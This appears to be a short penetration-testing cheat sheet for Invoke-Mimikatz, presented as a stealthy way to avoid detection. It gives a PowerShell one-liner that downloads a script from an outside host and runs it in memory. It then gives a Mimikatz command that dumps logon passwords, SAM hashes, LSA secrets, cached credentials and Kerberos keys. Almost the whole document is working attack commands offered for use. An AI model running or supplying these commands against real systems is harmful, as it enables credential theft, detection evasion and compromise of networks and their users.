# Invoke-Mimikatz
Using Invoke-Mimikatz in PowerShell offers stealthy in-memory execution that avoids detection by not writing files to disk, making it ideal for security assessments with minimal system footprint.

## Deliver
1. Start a Powershell with administrative privileges
2. Inject mimikatz into the memory:
```
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.165/Invoke-Mimikatz.ps1')
```

## Usage
**NOTE**: Only choose the commands you need.
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /inject" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
